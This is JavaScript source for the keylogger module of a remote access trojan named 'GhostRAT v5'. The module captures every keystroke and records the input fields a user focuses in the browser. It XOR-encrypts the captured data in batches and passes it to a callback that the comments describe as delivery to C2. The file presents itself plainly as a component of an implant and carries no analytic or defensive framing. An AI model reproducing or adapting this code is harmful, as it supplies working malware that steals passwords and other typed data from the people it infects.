/**
 * GhostRAT v5 — Keylogger Module
 * 
 * Captures keyboard events in the browser and encodes them for C2 delivery.
 * 
 * Features:
 * - Captures all keyboard events (keydown, keyup, input)
 * - Encodes special keys (Enter, Backspace, Tab, etc.)
 * - Buffers captured keys and sends in batches
 * - Supports text input field detection and capture
 * - XOR encryption for captured key data
 */

class Keylogger {
    constructor(config = {}) {
        this.config = config;
        this.isCapturing = false;
        this.keyBuffer = [];
        this.maxBufferSize = config.maxBufferSize || 256;
        this.flushInterval = config.flushInterval || 5000;
        this.cryptoKey = config.cryptoKey || 'GHOSTRATV5';
        this.onFlush = null; // Callback to send captured keys
        this.captureStartTime = null;
        this.lastKeyTime = null;
        this.keyPresses = [];
        this.textInputs = [];
    }

    /**
     * Start keylogging
     */
    start() {
        if (this.isCapturing) return;

        this.isCapturing = true;
        this.captureStartTime = Date.now();

        // Set up key event listeners
        document.addEventListener('keydown', this.handleKeyDown.bind(this), true);
        document.addEventListener('keyup', this.handleKeyUp.bind(this), true);
        document.addEventListener('focus', this.handleFocus.bind(this), true);

        // Set up flush timer
        this.flushTimer = setInterval(() => {
            this.flushBuffer();
        }, this.flushInterval);

        console.log('[GhostRAT v5 Keylogger] Started');
    }

    /**
     * Stop keylogging
     */
    stop() {
        if (!this.isCapturing) return;

        this.isCapturing = false;

        // Remove event listeners
        document.removeEventListener('keydown', this.handleKeyDown.bind(this), true);
        document.removeEventListener('keyup', this.handleKeyUp.bind(this), true);
        document.removeEventListener('focus', this.handleFocus.bind(this), true);

        // Clear flush timer
        if (this.flushTimer) {
            clearInterval(this.flushTimer);
            this.flushTimer = null;
        }

        // Flush remaining keys
        this.flushBuffer();

        console.log('[GhostRAT v5 Keylogger] Stopped');
    }

    /**
     * Handle keydown event
     */
    handleKeyDown(event) {
        if (!this.isCapturing) return;

        const keyData = {
            key: event.key,
            code: event.code,
            keyCode: event.keyCode,
            timeStamp: Date.now(),
            type: 'keydown'
        };

        this.keyPresses.push(keyData);
        this.lastKeyTime = keyData.timeStamp;

        // Encode key for buffer
        const encoded = this.encodeKey(event);
        this.keyBuffer.push(encoded);

        // Flush if buffer is full
        if (this.keyBuffer.length >= this.maxBufferSize) {
            this.flushBuffer();
        }
    }

    /**
     * Handle keyup event
     */
    handleKeyUp(event) {
        if (!this.isCapturing) return;
        // Optionally track keyup events for more accurate timing
    }

    /**
     * Handle focus event (capture focus target)
     */
    handleFocus(event) {
        if (!this.isCapturing) return;

        const target = event.target;
        const tagName = target.tagName.toLowerCase();

        // Track text input fields
        if (tagName === 'input' || tagName === 'textarea' || tagName === 'select') {
            const inputType = target.type || 'text';
            const inputId = target.id || '';
            const inputName = target.name || '';
            const inputClass = target.className || '';
            const inputPlaceholder = target.placeholder || '';

            const inputInfo = {
                type: inputType,
                id: inputId,
                name: inputName,
                class: inputClass,
                placeholder: inputPlaceholder,
                timestamp: Date.now()
            };

            this.textInputs.push(inputInfo);

            // Limit stored inputs
            if (this.textInputs.length > 100) {
                this.textInputs.shift();
            }
        }
    }

    /**
     * Encode key event to byte array
     */
    encodeKey(event) {
        const keyMap = {
            'Enter': 0x01,
            'Backspace': 0x02,
            'Tab': 0x03,
            'Escape': 0x04,
            'Delete': 0x05,
            'ArrowUp': 0x06,
            'ArrowDown': 0x07,
            'ArrowLeft': 0x08,
            'ArrowRight': 0x09,
            'Home': 0x0A,
            'End': 0x0B,
            'PageUp': 0x0C,
            'PageDown': 0x0D,
            'Insert': 0x0E,
            'F1': 0x10,
            'F2': 0x11,
            'F3': 0x12,
            'F4': 0x13,
            'F5': 0x14,
            'F6': 0x15,
            'F7': 0x16,
            'F8': 0x17,
            'F9': 0x18,
            'F10': 0x19,
            'F11': 0x1A,
            'F12': 0x1B,
            'CapsLock': 0x1C,
            'NumLock': 0x1D,
            'ScrollLock': 0x1E
        };

        // Special key
        if (keyMap[event.key]) {
            return [0x80, keyMap[event.key]]; // Special key marker + code
        }

        // Regular character
        const charCode = event.key.charCodeAt(0);
        return [charCode];
    }

    /**
     * Flush key buffer and send to C2
     */
    flushBuffer() {
        if (this.keyBuffer.length === 0) return;

        const keys = this.keyBuffer.splice(0);
        const keyData = new Uint8Array(keys);

        // XOR encrypt key data
        const encrypted = this.xorEncrypt(keyData, this.cryptoKey);

        // Send via callback
        if (this.onFlush) {
            this.onFlush({
                keys: encrypted,
                keyCount: keyData.length,
                textInputs: [...this.textInputs],
                captureDuration: Date.now() - this.captureStartTime
            });
        }

        // Clear tracked inputs after flush
        this.textInputs = [];
    }

    /**
     * XOR encrypt data
     */
    xorEncrypt(data, key) {
        const keyBytes = new TextEncoder().encode(key);
        const result = new Uint8Array(data.length);

        for (let i = 0; i < data.length; i++) {
            result[i] = data[i] ^ keyBytes[i % keyBytes.length];
        }

        return result;
    }

    /**
     * Set flush callback
     */
    setFlushCallback(callback) {
        this.onFlush = callback;
    }

    /**
     * Get keylogger statistics
     */
    getStats() {
        return {
            keysCaptured: this.keyPresses.length,
            bufferLength: this.keyBuffer.length,
            captureDuration: this.captureStartTime ? Date.now() - this.captureStartTime : 0,
            isCapturing: this.isCapturing
        };
    }
}

// Export for use in WebGPU implant
if (typeof module !== 'undefined' && module.exports) {
    module.exports = Keylogger;
}
